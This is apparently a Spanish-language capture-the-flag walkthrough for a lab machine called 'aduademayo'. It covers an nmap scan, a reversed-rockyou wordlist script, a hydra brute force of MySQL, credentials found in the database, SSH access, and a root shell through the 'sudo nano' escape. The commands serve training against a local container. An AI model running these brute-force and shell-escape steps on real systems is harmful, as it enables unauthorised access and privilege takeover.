---
Maquina: aduademayo
SO: Linux
Explotación: Análisis de imágenes y web
Escala_privs: Permisos sudo
Dificultad: Fácil
tags:
  - maquina
  - web_discovery
  - analisis_imagen
  - linux
  - escala_privs
  - ssh
  - web
---
## Reconocimiento

1. **Explorar los puerto abiertos del docker**: 

```bash 
nmap -p- --open --min-rate 5000 -sSV -Pn 172.17.0.2
```

![[Pasted image 20241119084416.png]]

Vamos a comprobar el estado del portal web a ver que información nos puede proporcionar.

![[Pasted image 20241119084507.png]]

Parece ser un fan de V de vendetta jeje, nos da a entender que es importante el nombre del personaje... Osea V.... Vamos a probar a hacer fuerza bruta al mysql con este nombre.

Tras probar varias cosas lo que había que hacer es invertir el rockyou.txt y eliminar los caracteres especiales, yo he utilizado el siguiente código ->

```python
import re

# Leer el archivo completo y procesarlo
with open("rockyou.txt", "r", encoding="utf-8", errors="ignore") as infile:
    # Leer todas las líneas y limpiar caracteres especiales
    passwords = [re.sub(r"[^a-zA-Z0-9]", "", line.strip()) for line in infile]
    
# Invertir el orden de las contraseñas
passwords = list(filter(None, passwords))[::-1]  # Eliminar líneas vacías y luego invertir

# Guardar las contraseñas invertidas en un nuevo archivo
with open("rockyou_invertido.txt", "w", encoding="utf-8") as outfile:
    outfile.write("\n".join(passwords))

print("Archivo procesado y guardado como 'rockyou_invertido.txt'")
```

Y tras invertir y probar la conexión por fuerza bruta obtenemos lo siguiente ->

```bash
hydra -l V -P rockyou_invertido.txt mysql://172.17.0.2 -f
```

![[Pasted image 20241120090144.png]]

Y conseguimos el user V / ie168. Ahora toca intentar iniciar sesión en el mysql yyyyyyy.. Estamos dentro

![[Pasted image 20241120090250.png]]

Tras indagar un poco en las bases de datos, nos podemos encontrar con el usuario Vendetta y la pass OldBailey

![[Pasted image 20241120090556.png]]

Y me da en la nariz que con este usuario podemos intentar conectarnos al ssh del host.

![[Pasted image 20241120090742.png]]

Parece que si que nos podemos conectar ;), ahora toca ver los permisos que tenemos.

![[Pasted image 20241120091004.png]]

Vemos que estamos ante el mítico nano con demasiados permisos...

```bash
sudo nano
^R^X
reset; sh 1>&0 2>&0
```

![[Pasted image 20241120091106.png]]

Y ya lo tenemos ;)